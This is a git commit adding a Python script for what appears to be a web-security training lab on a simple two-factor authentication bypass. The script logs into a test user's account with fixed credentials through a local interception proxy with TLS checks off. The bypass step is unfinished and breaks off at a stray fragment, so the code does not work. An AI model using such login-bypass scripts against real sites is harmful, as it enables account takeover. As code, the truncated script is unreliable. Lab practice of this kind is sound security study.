ec46480b461f1a40e58097c43507ebc666604eea
NANA-PREMPEH <oseiprempehwilliams@gmail.com>
2024-02-22 16:43:45 -0500

    2 lessions

---
+++ Authentication Vulnerabilities/lab 2: 2FA simple bypass/authentication-lab-02.py
@@ -0,0 +1,31 @@
+import requests
+import sys
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def access_carlos_account(s, url):
+
+    # Log into Carlos's account
+    print("(+) Logging into Carlos's account and bypassing @FA verfication...")
+    login_url = url + "/login"
+    login_data = {"username": "carlos", "password": "montaya"}
+    r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)
+
+    # Confirm bypass
+    myacc
+
+def main():
+    if len(sys.argv) !=2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+
+    s = requests.Session()
+    url = sys.argv[1]
+    access_carlos_account(s, url)
+
+if __name__ == "__main__":
+    main()
